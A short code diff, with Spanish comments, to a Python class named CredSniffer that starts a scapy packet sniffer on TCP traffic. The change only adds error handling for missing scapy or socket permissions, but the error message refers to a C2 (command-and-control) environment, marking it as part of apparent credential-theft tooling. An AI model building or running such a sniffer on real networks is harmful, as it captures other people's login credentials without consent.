@@ -14,7 +14,7 @@ import time
 try:
     from scapy.all import IP, Raw, TCP, AsyncSniffer
     _SCAPY_AVAILABLE = True
-except ImportError:  # pragma: no cover - entorno mínimo sin scapy
+except (ImportError, OSError):  # pragma: no cover - scapy ausente o sin permisos de socket
     IP = Raw = TCP = AsyncSniffer = None  # type: ignore[assignment]
     _SCAPY_AVAILABLE = False
 
@@ -124,6 +124,8 @@ class CredSniffer:
 
     # ------------------------------------------------------------------ ciclo de vida
     def start(self) -> None:
+        if not _SCAPY_AVAILABLE:
+            raise RuntimeError("Scapy o los permisos para inicializar sockets no están disponibles en el entorno C2")
         self._sniffer = AsyncSniffer(iface=self.iface, filter="tcp",
                                      prn=self._process, store=False)
         self._sniffer.start()
